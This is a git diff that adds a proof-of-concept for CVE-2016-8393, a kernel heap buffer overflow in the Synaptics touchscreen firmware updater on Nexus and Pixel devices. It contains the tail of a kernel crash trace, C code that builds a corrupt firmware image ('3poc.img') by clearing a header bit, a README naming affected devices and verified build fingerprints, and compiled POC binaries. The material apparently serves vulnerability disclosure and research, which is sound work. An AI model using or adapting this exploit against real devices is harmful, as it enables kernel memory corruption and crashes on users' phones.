+  pc ffffffc00008a308   sp ffffffc04cb2f660   fp ffffffc04cb2f720
+__do_kernel_fault.part.7+0x74/0x84:
+  pc ffffffc0009e2244   sp ffffffc04cb2f730   fp ffffffc04cb2f760
+do_sect_fault+0x0/0x18:
+  pc ffffffc000097d30   sp ffffffc04cb2f770   fp ffffffc04cb2f790
+do_translation_fault+0x34/0x4c:
+  pc ffffffc0000981d0   sp ffffffc04cb2f7a0   fp ffffffc04cb2f7c0
+do_mem_abort+0x3c/0x9c:
+  pc ffffffc00008160c   sp ffffffc04cb2f7d0   fp ffffffc04cb2f7d0
+el1_da+0x20/0x74:
+  pc ffffffc000084c30   sp ffffffc04cb2f7e0   fp ffffffc04cb2f9a0
+synaptics_rmi4_spi_read+0x90/0x278:
+  pc ffffffc00062d3ec   sp ffffffc04cb2f9b0   fp ffffffc04cb2fa00
+synaptics_rmi4_f12_init+0x7c/0x538:
+  pc ffffffc00062e54c   sp ffffffc04cb2fa10   fp ffffffc04cb2fae0
+synaptics_rmi4_query_device+0x62c/0xcbc:
+  pc ffffffc00062fb00   sp ffffffc04cb2faf0   fp ffffffc04cb2fba0
+synaptics_rmi4_reset_device+0xa0/0x1ac:
+  pc ffffffc000631680   sp ffffffc04cb2fbb0   fp ffffffc04cb2fc70
+synaptics_fw_updater+0x134/0x8b0:
+  pc ffffffc000635138   sp ffffffc04cb2fc80   fp ffffffc04cb2fcc0
+fwu_sysfs_do_reflash_store+0x9c/0xf8:
+  pc ffffffc000635950   sp ffffffc04cb2fcd0   fp ffffffc04cb2fd80
+dev_attr_store+0x18/0x28:
+  pc ffffffc0004625a4   sp ffffffc04cb2fd90   fp ffffffc04cb2fdc0
+sysfs_write_file+0xdc/0x154:
+  pc ffffffc00020cff8   sp ffffffc04cb2fdd0   fp ffffffc04cb2fdd0
+vfs_write+0xa8/0x1b4:
+  pc ffffffc00019f280   sp ffffffc04cb2fde0   fp ffffffc04cb2fe30
+SyS_write+0x54/0x1ac:
+  pc ffffffc00019f58c   sp ffffffc04cb2fe40   fp ffffffc04cb2fe80
+ret_fast_syscall+0x0/0x24:
+  pc ffffffc000085388   sp ffffffc04cb2fe90   fp 0000007fc54430b0
+watchdog fiq cpu 0
+pid: 2404  comm: MicroRecognitio
+  x0 0000000000000000   x1 ffffffc001075868
+  x2 0000000000000002   x3 0000000000000001
+  x4 000000000000073a   x5 0000000000000003
+  x6 ffffffc0006ad1e0   x7 ffffffc001075868
+  x8 0000000000000003   x9 0000000000000035
+ x10 0000000000000065  x11 0000000000000030
+ x12 0000000000000030  x13 0000000000000030
+ x14 0000000000000037  x15 0000000000000034
+ x16 000000000000000a  x17 0000000000000000
+ x18 3a6465746e696154  x19 ffffffc001052eb8
+ x20 ffffffc0010c3000  x21 0000000000000000
+ x22 0000000000000000  x23 ffffffc05edb4000
+ x24 ffffff8000002010  x25 ffffffc000a09000
+ x26 ffffffc001012000  x27 ffffffc001012000
+ x28 ffffffc05edb4000  x29 ffffffc05edb7e30
+ x30 ffffffc000090584   sp ffffffc05edb7e30
+  pc ffffffc00009058c cpsr 000000c5 (EL1h)
+
+handle_IPI+0x11c/0x154:
+  pc ffffffc00009058c   sp ffffffc05edb7e30   fp ffffffc05edb7e30
+gic_handle_irq+0x94/0x1a0:
+  pc ffffffc0000817f0   sp ffffffc05edb7e40   fp ffffffc05edb7e70
+el0_irq_naked+0x34/0x54:
+  pc ffffffc000085290   sp ffffffc05edb7e80   fp 00000074ea54c460
+
diff --git a/CVE-2016-8393/3create_3poc_img b/CVE-2016-8393/3create_3poc_img
new file mode 100755
index 0000000..38b5251
Binary files /dev/null and b/CVE-2016-8393/3create_3poc_img differ
diff --git a/CVE-2016-8393/3create_3poc_img.c b/CVE-2016-8393/3create_3poc_img.c
new file mode 100644
index 0000000..b82f155
--- /dev/null
+++ b/CVE-2016-8393/3create_3poc_img.c
@@ -0,0 +1,235 @@
+#include <errno.h>                                                              
+#include <stddef.h>                                                             
+#include <stdio.h>                                                              
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdlib.h>                                                             
+#include <string.h>                                                             
+#include <unistd.h>                                                             
+#include <fcntl.h>                                                              
+#include <time.h>                                                               
+#include <sys/types.h>                                                          
+#include <sys/stat.h>                                                           
+#include <sys/time.h> 
+
+//#define SYNAPTICS_IMG "poc3.img"
+#define SYNAPTICS_IMG "synaptics.img"
+
+#define IMAGE_AREA_OFFSET 0x100
+#define SYNAPTICS_RMI4_PRODUCT_INFO_SIZE 2
+#define SYNAPTICS_RMI4_PRODUCT_ID_SIZE 10
+
+struct image_header {
+	/* 0x00 - 0x0f */
+	unsigned char checksum[4];
+	unsigned char reserved_04;
+	unsigned char reserved_05;
+	unsigned char options_firmware_id:1;
+	unsigned char options_bootloader:1;
+	unsigned char options_reserved:6;
+	unsigned char bootloader_version;
+	unsigned char firmware_size[4];
+	unsigned char config_size[4];
+	/* 0x10 - 0x1f */
+	unsigned char product_id[SYNAPTICS_RMI4_PRODUCT_ID_SIZE];
+	unsigned char package_id[2];
+	unsigned char package_id_revision[2];
+	unsigned char product_info[SYNAPTICS_RMI4_PRODUCT_INFO_SIZE];
+	/* 0x20 - 0x2f */
+	unsigned char bootloader_addr[4];
+	unsigned char bootloader_size[4];
+	unsigned char ui_addr[4];
+	unsigned char ui_size[4];
+	/* 0x30 - 0x3f */
+	unsigned char ds_id[16];
+	/* 0x40 - 0x4f */
+	unsigned char disp_config_addr[4];
+	unsigned char disp_config_size[4];
+	unsigned char reserved_48_4f[8];
+	/* 0x50 - 0x53 */
+	unsigned char firmware_id[4];
+};
+
+struct image_header_data {
+	bool contains_firmware_id;
+	bool contains_bootloader;
+	bool contains_disp_config;
+	unsigned int firmware_id;
+	unsigned int checksum;
+	unsigned int firmware_size;
+	unsigned int config_size;
+	unsigned int bootloader_size;
+	unsigned int disp_config_offset;
+	unsigned int disp_config_size;
+	unsigned char bootloader_version;
+	unsigned char product_id[SYNAPTICS_RMI4_PRODUCT_ID_SIZE + 1];
+	unsigned char product_info[SYNAPTICS_RMI4_PRODUCT_INFO_SIZE];
+};
+
+static unsigned int le_to_uint(const unsigned char *ptr)
+{
+	return (unsigned int)ptr[0] +
+			(unsigned int)ptr[1] * 0x100 +
+			(unsigned int)ptr[2] * 0x10000 +
+			(unsigned int)ptr[3] * 0x1000000;
+}
+
+static uint32_t syn_crc(uint16_t *data, uint16_t len)
+{
+	uint32_t sum1, sum2;
+	sum1 = sum2 = 0xFFFF;
+	if (data) {
+		while (len--) {
+			sum1 += *data++;
+			sum2 += sum1;
+			sum1 = (sum1 & 0xFFFF) + (sum1 >> 16);
+			sum2 = (sum2 & 0xFFFF) + (sum2 >> 16);
+		}
+	} else {
+		perror("data incorrect");
+		return (0xFFFF | 0xFFFF << 16);
+	}
+	return sum1 | (sum2 << 16);
+}
+enum bl_version {
+	V5 = 5,
+	V6 = 6,
+};
+
+
+static void parse_header(struct image_header_data *header,
+		const unsigned char *fw_image)
+{
+	struct image_header *data = (struct image_header *)fw_image;
+
+	header->checksum = le_to_uint(data->checksum);
+        #ifdef DEBUG
+        printf("%-25s %u\n","checksum:", header->checksum);
+        #endif        
+
+	header->bootloader_version = data->bootloader_version;
+        #ifdef DEBUG
+        printf("%-25s %u\n","bootloader_version:", (unsigned int)header->bootloader_version);
+        #endif        
+	
+	header->firmware_size = le_to_uint(data->firmware_size);
+        #ifdef DEBUG
+        printf("%-25s %u\n","firmware_size:", header->firmware_size);
+        #endif        
+	
+	header->config_size = le_to_uint(data->config_size);
+        #ifdef DEBUG
+        printf("%-25s %u\n","config_size:", header->config_size);
+        #endif        
+	
+	memcpy(header->product_id, data->product_id, sizeof(data->product_id));
+	header->product_id[sizeof(data->product_id)] = 0;
+        #ifdef DEBUG
+        printf("%-25s %s\n","product_id:", header->product_id);
+        #endif        
+	
+	memcpy(header->product_info, data->product_info,
+			sizeof(data->product_info));
+        #ifdef DEBUG
+        printf("%-25s %s\n","product_info:", header->product_info);
+        #endif        
+	
+	header->contains_firmware_id = data->options_firmware_id;
+        #ifdef DEBUG
+        printf("%-25s %d\n","contains_firmware_id:", header->contains_firmware_id);
+        #endif        
+	
+	if (header->contains_firmware_id){
+		header->firmware_id = le_to_uint(data->firmware_id);
+                #ifdef DEBUG
+                printf("%-25s %u\n","firmware_id:", header->firmware_id);
+                #endif        
+        }
+	header->contains_bootloader = data->options_bootloader;
+        #ifdef DEBUG
+        printf("%-25s %d\n","contains_bootloader:", header->contains_bootloader);
+        #endif        
+	
+	if (header->contains_bootloader){
+		header->bootloader_size = le_to_uint(data->bootloader_size);
+                #ifdef DEBUG
+                printf("%-25s %u\n","bootloader_size:", header->bootloader_size);
+                #endif        
+        }
+	if ((header->bootloader_version == V5) && header->contains_bootloader) {
+		header->contains_disp_config = true;
+		header->disp_config_offset = le_to_uint(data->disp_config_addr);
+                #ifdef DEBUG
+                printf("%-25s %u\n","disp_config_offset:", header->disp_config_offset);
+                #endif        
+
+		header->disp_config_size = le_to_uint(data->disp_config_size);
+                #ifdef DEBUG
+                printf("%-25s %u\n","disp_config_size:", header->disp_config_size);
+                #endif        
+	
+	} else {
+		header->contains_disp_config = false;
+	}
+
+	return;
+}
+int unflip_contains_firmware_id(char *fw_image){
+	struct image_header *data = (struct image_header *)fw_image;
+        data->options_firmware_id = 0;
+        return 0;
+}
+
+int write_img_to_file(char *fw_img, unsigned int fw_img_size, char *filename){
+    FILE *fp;
+    fp = fopen(filename, "wb");
+    fwrite(fw_img, fw_img_size, 1, fp);
+    fclose(fp);
+    return 0;
+}
+
+int main(){
+    // Ugly code below; written with haste.
+    struct image_header_data header;
+    unsigned char *fw_img;
+    unsigned int fw_img_size;
+    FILE *fp;
+    if (!(fp = fopen(SYNAPTICS_IMG, "r"))) {
+        perror("Couldnt open synaptics.img");
+        return EXIT_FAILURE;
+    }
+    fseek(fp, 0L, SEEK_END);
+    fw_img_size = ftell(fp);
+    fw_img = (unsigned char *)malloc(fw_img_size);
+    fseek(fp, 0L, SEEK_SET);
+    if (fread(fw_img, 1, fw_img_size, fp) != fw_img_size){
+        perror("Can't read img in its entirety.");
+        fclose(fp);
+    };
+
+    #ifdef DEBUG
+    printf("===================================\n");
+    printf("[+] synaptics.img original header:\n");
+    printf("-----------------------------------\n");
+    parse_header(&header, fw_img);
+    printf("===================================\n");
+    #endif
+
+    /* CREATING POC 3 */
+    printf("[+] Unset the contains_firmware_id bit.\n");
+    unflip_contains_firmware_id(fw_img);
+    write_img_to_file(fw_img, fw_img_size, "3poc.img");
+    printf("[+] Patched img was written to 3poc.img.\n");
+
+    #ifdef DEBUG
+    printf("===================================\n");
+    printf("[+] 3poc.img patched header:\n");
+    printf("-----------------------------------\n");
+    parse_header(&header, fw_img);
+    printf("===================================\n");
+    #endif
+
+    free(fw_img);
+    fclose(fp);
+    return 0;
+}
diff --git a/CVE-2016-8393/3poc.img b/CVE-2016-8393/3poc.img
new file mode 100644
index 0000000..8ad9e68
Binary files /dev/null and b/CVE-2016-8393/3poc.img differ
diff --git a/CVE-2016-8393/README.md b/CVE-2016-8393/README.md
new file mode 100644
index 0000000..24e71ca
--- /dev/null
+++ b/CVE-2016-8393/README.md
@@ -0,0 +1,23 @@
+# CVE-2016-8393
+
+Kernel Heap Buffer Overflow.
+
+Affects: `Nexus 5X`, `Nexus 6P`, `Nexus 9`, `Android One`, `Pixel`, `Pixel XL`
+
+Verified on `Nexus 9`. Fingerprints:
+
+```
+google/volantis/flounder:6.0.1/MOB30W/3031100:user/release-keys
+google/volantis/flounder:7.0/NRD90M/3085278:user/release-keys
+google/volantis/flounder:7.0/NRD90R/3141966:user/release-keys
+```
+
+* Google's response: 
+  - Severity - High
+
+
+For instructions on how to use the POC see `Heap Overflow #3` in `research.pdf`.
+
+- `3.c` - the actual POC code.
+- `3create_3poc_img.c` - takes `synaptics.img` and constructs `3poc.img` - a corrupt firmware image that triggers the bug.
+- `3` and `3create_3poc_img` are the compiled `aarch64` binaries.
diff --git a/CVE-2016-8393/synaptics.img b/CVE-2016-8393/synaptics.img
new file mode 100644
index 0000000..2f24095
Binary files /dev/null and b/CVE-2016-8393/synaptics.img differ
